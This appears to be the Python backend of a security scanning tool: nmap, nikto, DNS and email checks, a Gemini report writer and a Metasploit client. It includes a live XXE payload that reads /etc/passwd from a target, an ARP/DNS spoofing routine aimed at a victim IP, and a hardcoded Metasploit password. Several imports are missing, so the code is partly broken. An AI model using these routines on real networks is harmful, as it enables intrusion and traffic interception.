import nmap
import subprocess
import json
import re
import os
import shlex
import sublist3r
import dns.resolver
import whois
from flask import render_template
from pymetasploit3.msfrpc import MsfRpcClient
import time
import ipaddress
import google.generativeai as genai

def run_command(command):
    try:
        result = subprocess.run(command, capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            return {'stdout': result.stdout, 'stderr': None}
        else:
            error_output = result.stdout + "\n" + result.stderr
            return {'stdout': None, 'stderr': error_output.strip()}
    except subprocess.TimeoutExpired:
        return {'stdout': None, 'stderr': 'Error: Command timed out after 30 seconds.'}
    except Exception as e:
        return {'stdout': None, 'stderr': f"An unexpected error occurred: {str(e)}"}

def perform_ping_scan(target):
    sanitized_target = shlex.quote(target)
    command = ['ping', '-c', '4', sanitized_target]
    return run_command(command)

def perform_traceroute_scan(target):
    sanitized_target = shlex.quote(target)
    command = ['traceroute', sanitized_target]
    return run_command(command)

def perform_nslookup_scan(target):
    sanitized_target = shlex.quote(target)
    command = ['nslookup', sanitized_target]
    return run_command(command)

def perform_nmap_scan(target, scan_type):
    nm = nmap.PortScanner()
    scan_args = {
        'ping_scan': '-sn',
        'quick_scan': '-T4 -F',
        'intense_scan': '-T4 -A -v',
        'udp_scan': '-sU',
        'vuln_scan': '--script vuln',
        'ssh_audit': '-p 22 --script ssh2-enum-algos,ssh-auth-methods'
    }
    arguments = scan_args.get(scan_type)
    if not arguments:
        return {'stdout': None, 'stderr': f"Invalid scan type: {scan_type}"}

    try:
        nm.scan(hosts=str(target), arguments=arguments)
        output_string = ""
        for host in nm.all_hosts():
            output_string += f"----------------------------------------------------\n"
            output_string += f"Host : {host} ({nm[host].hostname()})\n"
            output_string += f"State : {nm[host].state()}\n"
            for proto in nm[host].all_protocols():
                output_string += f"----------\n"
                output_string += f"Protocol : {proto}\n"
                ports = nm[host][proto].keys()
                for port in sorted(ports):
                    state = nm[host][proto][port]['state']
                    name = nm[host][proto][port]['name']
                    product = nm[host][proto][port].get('product', '')
                    version = nm[host][proto][port].get('version', '')
                    extrainfo = nm[host][proto][port].get('extrainfo', '')
                    script_output = nm[host][proto][port].get('script', {})
                    output_string += f"port : {port}\tstate : {state}\tname : {name}\tproduct : {product} {version} {extrainfo}\n"
                    if script_output:
                        output_string += "Script output:\n"
                        for script_id, data in script_output.items():
                            output_string += f"  {script_id}:\n{data}\n"
        if not output_string:
            return {'stdout': nm.csv(), 'stderr': "No open ports or specific results found. Raw Nmap output provided."}
        return {'stdout': output_string, 'stderr': None}
    except nmap.PortScannerError as e:
        return {'stdout': None, 'stderr': f"Nmap error: {str(e)}. Is Nmap installed on the system?"}
    except Exception as e:
        return {'stdout': None, 'stderr': f"An unexpected error occurred: {str(e)}"}
def get_network_device_info(device_type, host, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=host, username=username, password=password, timeout=10)
        if device_type == 'mikrotik':
            command = "/export"
        elif device_type == 'cisco_ios':
            command = "show running-config"
        else:
            return {"status": "error", "message": f"Unsupported device type: {device_type}"}
        stdin, stdout, stderr = client.exec_command(command)
        config_data = stdout.read().decode('utf-8')
        error_data = stderr.read().decode('utf-8')
        client.close()
        if error_data:
            return {"status": "error", "message": error_data}
        return {"status": "completed", "config_data": config_data}
    except paramiko.AuthenticationException:
        return {"status": "error", "message": "Authentication failed. Please check username and password."}
    except paramiko.SSHException as e:
        return {"status": "error", "message": f"SSH connection error: {str(e)}"}
    except Exception as e:
        return {"status": "error", "message": f"An unexpected error occurred: {str(e)}"}

def run_domain_scan(target_domain, scan_type):
    if scan_type == 'subdomain_enum':
        try:
            subdomains = sublist3r.main(target_domain, 40, '', ports=None, silent=True, verbose=False, enable_bruteforce=False, engines=None)
            return {"status": "completed", "result": subdomains}
        except IndexError:
            return {"status": "error", "message": "Subdomain enumeration failed: Sublist3r could not find expected data on the target website. This might be due to website changes or anti-scraping measures."}
        except Exception as e:
            return {"status": "error", "message": str(e)}
    else:
        return {"status": "error", "message": "Unsupported scan type for domain."}

def run_email_analysis(target_email):
    results = {}
    try:
        # 1. Email format validation
        if not re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$".encode('idna').decode('ascii'), target_email):
            results['format_validation'] = "Invalid email format."
            return {"status": "completed", "results": results}

        results['format_validation'] = "Valid email format."

        domain = target_email.split('@')[1]

        # 2. Domain existence check (A record for the domain)
        try:
            a_records = dns.resolver.resolve(domain, 'A')
            results['domain_exists'] = f"Domain {domain} exists with A records: {[str(r) for r in a_records]}"
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            results['domain_exists'] = f"Domain {domain} does not appear to have A records or does not exist."

        # 3. MX record lookup
        try:
            mx_records = dns.resolver.resolve(domain, 'MX')
            mx_servers = []
            for rdata in mx_records:
                mx_servers.append({'preference': rdata.preference, 'exchange': str(rdata.exchange)})
            results['mx_records'] = mx_servers if mx_servers else "No MX records found."
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            results['mx_records'] = "No MX records found."

        return {"status": "completed", "results": results}
    except Exception as e:
        return {"status": "error", "message": str(e)}

import email

def perform_email_header_analysis(raw_headers):
    results = {}
    try:
        msg = email.message_from_string(raw_headers)

        results['from'] = msg.get('From')
        results['to'] = msg.get('To')
        results['subject'] = msg.get('Subject')
        results['date'] = msg.get('Date')
        results['message_id'] = msg.get('Message-ID')

        # Extract Received headers to trace path
        received_headers = msg.get_all('Received')
        if received_headers:
            results['received_path'] = received_headers

        # Check for SPF, DKIM, DMARC in headers (Authentication-Results)
        auth_results = msg.get('Authentication-Results')
        if auth_results:
            results['authentication_results'] = auth_results
            if 'spf=pass' in auth_results.lower():
                results['spf_status'] = 'PASS'
            elif 'spf=fail' in auth_results.lower():
                results['spf_status'] = 'FAIL'
            else:
                results['spf_status'] = 'UNKNOWN'

            if 'dkim=pass' in auth_results.lower():
                results['dkim_status'] = 'PASS'
            elif 'dkim=fail' in auth_results.lower():
                results['dkim_status'] = 'FAIL'
            else:
                results['dkim_status'] = 'UNKNOWN'

            if 'dmarc=pass' in auth_results.lower():
                results['dmarc_status'] = 'PASS'
            elif 'dmarc=fail' in auth_results.lower():
                results['dmarc_status'] = 'FAIL'
            else:
                results['dmarc_status'] = 'UNKNOWN'

        return {"status": "completed", "results": results}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def perform_mail_server_port_scan(target_host):
    nm = nmap.PortScanner()
    mail_ports = '25,110,143,465,587,993,995' # SMTP, POP3, IMAP, SMTPS, Submission, IMAPS, POP3S
    try:
        nm.scan(hosts=target_host, arguments=f'-p {mail_ports}')
        output_string = ""
        for host in nm.all_hosts():
            output_string += f"----------------------------------------------------\n"
            output_string += f"Host : {host} ({nm[host].hostname()})\n"
            output_string += f"State : {nm[host].state()}\n"
            for proto in nm[host].all_protocols():
                output_string += f"----------\n"
                output_string += f"Protocol : {proto}\n"
                ports = nm[host][proto].keys()
                for port in sorted(ports):
                    state = nm[host][proto][port]['state']
                    name = nm[host][proto][port]['name']
                    output_string += f"port : {port}\tstate : {state}\tname : {name}\n"
        if not output_string:
            return {'stdout': "No mail ports found open.", 'stderr': None}
        return {'stdout': output_string, 'stderr': None}
    except nmap.PortScannerError as e:
        return {'stdout': None, 'stderr': f"Nmap error: {str(e)}. Is Nmap installed on the system?"}
    except Exception as e:
        return {'stdout': None, 'stderr': f"An unexpected error occurred: {str(e)}"}

def perform_email_auth_lookup(domain):
    results = {}
    try:
        # SPF Record
        try:
            spf_records = dns.resolver.resolve(domain, 'TXT')
            spf_found = [str(r) for r in spf_records if 'v=spf' in str(r).lower()]
            results['spf'] = spf_found if spf_found else "No SPF record found."
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            results['spf'] = "No SPF record found."

        # DMARC Record
        try:
            dmarc_records = dns.resolver.resolve(f'_dmarc.{domain}', 'TXT')
            dmarc_found = [str(r) for r in dmarc_records if 'v=dmarc1' in str(r).lower()]
            results['dmarc'] = dmarc_found if dmarc_found else "No DMARC record found."
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            results['dmarc'] = "No DMARC record found."

        # DKIM (requires selector, so a general check is hard without knowing selectors)
        # For a basic check, we can just state that DKIM is usually found via specific selectors.
        results['dkim'] = "DKIM records require a selector (e.g., default._domainkey.example.com). Cannot perform a general lookup without a selector."

        return {"status": "completed", "results": results}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def analyze_results_with_gemini(api_key, results, language, model_name='gemini-1.5-flash-latest'):
    try:
        genai.configure(api_key=api_key)
        model = genai.GenerativeModel(model_name)
        prompt = f"""
        You are a world-class cybersecurity expert and network analyst. Generate a highly professional, structured report based on the provided scan results.

        **CRITICAL FORMATTING GUIDELINES:**
        - This output will be injected directly into an HTML element.
        - Generate ONLY the report body content using semantic HTML tags (headings <h3>, paragraphs <p>, tables <table>, lists <ul>/<li>, bold <strong>).
        - Do NOT include <html>, <head>, <body> tags, or any code block fences (```html ... ```).
        - Generate the entire report in {language}.

        **Raw Scan Results:**
        ---
        {results}
        ---

        **Required Professional Report Structure (Use HTML tags):**
        <h3>Overall Risk Status: [INSERT CRITICAL, HIGH, MEDIUM, OR LOW HERE]</h3>
        <p>[A brief statement justifying this overall risk assessment.]</p>

        <h3>Executive Summary</h3>
        <p>[A high-level summary.]</p>

        <h3>Key Findings Analysis</h3>
        <ul>
            <li>[Itemized breakdown]</li>
        </ul>

        <h3>Risk Assessment</h3>
        <table border="1" cellpadding="10" style="width:100%; border-collapse:collapse;">
            <tr><th>Finding</th><th>Risk Level</th><th>Justification</th></tr>
            <tr><td>...</td><td>...</td><td>...</td></tr>
        </table>

        <h3>Technical Remediation Strategy</h3>
        <ol>
            <li>[Actionable step]</li>
        </ol>

        <h3>Recommended Tools for Remediation</h3>
        <ul>
            <li>[Tool name]</li>
        </ul>

        <h3>Analysis Methodology</h3>
        <p>[Methodology description]</p>

        <h3>Raw Data Appendix</h3>
        <pre>[Raw data]</pre>
        """
        response = model.generate_content(prompt)
        return {'status': 'completed', 'analysis': response.text}
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

def run_nikto_scan(target_url):
    """
    Runs a Nikto scan on the target URL.
    Assumes Nikto is installed and in the system's PATH.
    """
    try:
        parsed_url = urlparse(target_url)
        host = parsed_url.hostname
        if not host:
            return {'stdout': None, 'stderr': 'Invalid URL provided.'}
        
        command = ['nikto', '-h', host]
        # Add port if specified
        if parsed_url.port:
            command.extend(['-p', str(parsed_url.port)])
        
        # Handle SSL
        if parsed_url.scheme == 'https':
            command.append('-ssl')

        return run_command(command)
    except Exception as e:
        return {'stdout': None, 'stderr': f"An error occurred while preparing the Nikto scan: {str(e)}"}


def run_xxe_scan(target_url):
    """
    Performs a basic XXE vulnerability check by trying to read /etc/passwd.
    """
    xml_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<bugreport>
<title>test</title>
<cwe>test</cwe>
<cvss>test</cvss>
<description>&xxe;</description>
</bugreport>"""
    
    try:
        headers = {'Content-Type': 'application/xml'}
        response = requests.post(target_url, data=xml_payload, headers=headers, timeout=20)
        
        # Check for evidence of /etc/passwd in the response
        if 'root:x:0:0' in response.text:
            result = f"VULNERABLE: The target at {target_url} appears to be vulnerable to XXE.\n"
            result += "The response contained content from /etc/passwd.\n\n"
            result += "--- Response Snippet ---\n"
            result += response.text[:1000] + ("..." if len(response.text) > 1000 else "")
            return {'stdout': result, 'stderr': None}
        else:
            result = f"NOT VULNERABLE: The target at {target_url} does not appear to be vulnerable to this basic XXE check.\n"
            result += "The server responded, but the response did not contain the expected content from /etc/passwd."
            return {'stdout': result, 'stderr': None}

    except requests.exceptions.RequestException as e:
        return {'stdout': None, 'stderr': f"An error occurred while sending the XXE payload: {str(e)}"}
    except Exception as e:
        return {'stdout': None, 'stderr': f"An unexpected error occurred: {str(e)}"}


def run_dns_zone_transfer(target_domain):
    """
    Attempts a DNS zone transfer (AXFR) against the domain's name servers.
    """
    try:
        ns_records = dns.resolver.resolve(target_domain, 'NS')
        nameservers = [str(ns.target) for ns in ns_records]
        
        if not nameservers:
            return {'stdout': None, 'stderr': f"Could not find name servers for {target_domain}."}

        full_output = ""
        for ns in nameservers:
            full_output += f"--- Attempting Zone Transfer on {ns} ---\n"
            command = ['dig', 'AXFR', f'@{ns}', target_domain]
            result = run_command(command)
            if result['stderr']:
                full_output += f"Error: {result['stderr']}\n\n"
            elif result['stdout']:
                # Check if the transfer was successful or refused
                if "Transfer failed" in result['stdout'] or "failed" in result['stdout']:
                     full_output += "Zone transfer failed or was refused.\n\n"
                elif "XFR size" in result['stdout']:
                     full_output += "SUCCESS: Zone transfer completed.\n"
                     full_output += result['stdout'] + "\n\n"
                else:
                     full_output += "Zone transfer likely refused or no records found.\n\n"
            else:
                full_output += "No output from command.\n\n"
        
        return {'stdout': full_output, 'stderr': None}

    except dns.resolver.NoNameservers:
        return {'stdout': None, 'stderr': f"No NS records found for {target_domain}."}
    except Exception as e:
        return {'stdout': None, 'stderr': f"An unexpected error occurred: {str(e)}"}

def run_custom_scan(command_template, target):
    """
    Runs a custom scan by substituting the target into the command template.
    """
    try:
        # Sanitize the target to prevent command injection
        sanitized_target = shlex.quote(target)
        
        # Replace the placeholder with the sanitized target
        command_string = command_template.replace('{{target}}', sanitized_target)
        
        # Split the command string into a list for subprocess
        command_parts = shlex.split(command_string)
        
        return run_command(command_parts)
    except Exception as e:
        return {'stdout': None, 'stderr': f"An error occurred while preparing the custom scan: {str(e)}"}

def run_dns_spoof_test(victim_ip, target_domain, fake_ip):
    temp_hosts_file_path = '/tmp/temp_hosts'
    arpspoof_victim_process = None
    arpspoof_gateway_process = None
    dnsspoof_process = None

    try:
        # Get gateway IP
        gateway_ip_command = "ip route | grep default | awk '{print $3}'"
        gateway_ip_result = subprocess.run(gateway_ip_command, shell=True, capture_output=True, text=True)
        if gateway_ip_result.returncode != 0:
            return {'stdout': None, 'stderr': 'Failed to get gateway IP.'}
        gateway_ip = gateway_ip_result.stdout.strip()

        # Create temporary hosts file
        with open(temp_hosts_file_path, 'w') as f:
            f.write(f'{fake_ip} {target_domain}\n')

        # Enable IP forwarding
        run_command(['sysctl', '-w', 'net.ipv4.ip_forward=1'])

        # Start arpspoof processes
        arpspoof_victim_process = subprocess.Popen(['arpspoof', '-t', victim_ip, gateway_ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        arpspoof_gateway_process = subprocess.Popen(['arpspoof', '-t', gateway_ip, victim_ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Start dnsspoof process
        dnsspoof_process = subprocess.Popen(['dnsspoof', '-f', temp_hosts_file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Let it run for 30 seconds
        time.sleep(30)

        # Read the output
        stdout_output = dnsspoof_process.stdout.read()
        stderr_output = dnsspoof_process.stderr.read()

        return {'stdout': stdout_output, 'stderr': stderr_output}

    finally:
        # Terminate processes
        if arpspoof_victim_process:
            os.kill(arpspoof_victim_process.pid, signal.SIGTERM)
        if arpspoof_gateway_process:
            os.kill(arpspoof_gateway_process.pid, signal.SIGTERM)
        if dnsspoof_process:
            os.kill(dnsspoof_process.pid, signal.SIGTERM)

        # Disable IP forwarding
        run_command(['sysctl', '-w', 'net.ipv4.ip_forward=0'])

        # Delete temporary hosts file
        if os.path.exists(temp_hosts_file_path):
            os.remove(temp_hosts_file_path)

def connect_to_metasploit():
    try:
        client = MsfRpcClient('netiv3pass', port=55553, host='127.0.0.1', ssl=False)
        return client
    except Exception as e:
        print(f"Error connecting to Metasploit RPC: {e}")
        return None

def search_metasploit_modules(query):
    client = None
    try:
        client = connect_to_metasploit()
        if not client:
            return []

        # Search for modules
        # The 'module.search' method returns a dictionary of module details
        # We are interested in the 'fullname' of the modules
        search_results = client.call('module.search', query)
        
        modules = []
        if search_results and 'modules' in search_results:
            for module_type, module_list in search_results['modules'].items():
                for module_name in module_list:
                    modules.append(f"{module_type}/{module_name}")
        
        return modules
    except Exception as e:
        print(f"Error searching Metasploit modules: {e}")
        return []
    finally:
        if client:
            client.logout()

def run_scan(target, scan_type):
    if scan_type == 'subdomain_enum':
        return run_domain_scan(target, 'subdomain_enum')
    elif scan_type == 'port':
        # Default to quick scan for now, can be expanded later
        return perform_nmap_scan(target, 'quick_scan')
    elif scan_type == 'vulnerability':
        # Default to Nikto scan for now, can be expanded later
        return run_nikto_scan(target)
    elif scan_type == 'ping':
        return perform_ping_scan(target)
    else:
        return {"status": "error", "message": f"Unknown scan type: {scan_type}"}